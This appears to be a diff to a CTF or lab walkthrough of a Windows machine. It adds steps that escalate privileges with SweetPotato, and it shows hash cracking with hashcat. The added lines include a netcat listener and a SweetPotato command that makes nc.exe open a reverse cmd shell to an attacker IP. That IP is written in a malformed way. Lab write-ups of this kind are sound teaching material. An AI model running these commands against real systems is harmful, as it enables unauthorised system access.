@@ -335,7 +335,20 @@ hashcat -m 5600 hash.txt rockyou.txt -o cracked.txt
 whoami /priv
 `````
 ![image](https://user-images.githubusercontent.com/80599694/147991804-4aed2d4d-437a-4b62-b387-c590618c9bd4.png)
-#### Looks like we can escalate privlieges with Juicy Potato.  Well, thats what it reminds me of atleast.
+#### Looks like we can escalate privlieges with Sweet Potato.  Well, thats what it reminds me of atleast.
 
+## Let's get Admin Priv's!
+#### After I checked my priv's I went poking around the directories, and made my way to the Downloads folder.
+![image](https://user-images.githubusercontent.com/80599694/147991980-6f1571d2-32d3-4744-aaea-26f81f877b6a.png)
+#### Awesome! In the directory, there is already nc.exe (reverse shell opportunity) and SweetPotato. What do you know? 😆
+#### I am going to setup a netcat listener on my machine and get the machine to connect back after running SweetPotato.
+````bash
+rlwrap nc -lvnp 4445
+````
+#### Now Let's Run SweetPotato.exe
+````bash
+.\SweetPotato.exe -p nc.exe -a "-e cmd 10..13.12.249 4445"
+````
+![image](https://user-images.githubusercontent.com/80599694/147992256-28dec5c2-f0ca-4083-84ae-14f0fc25cf1a.png)
 
 
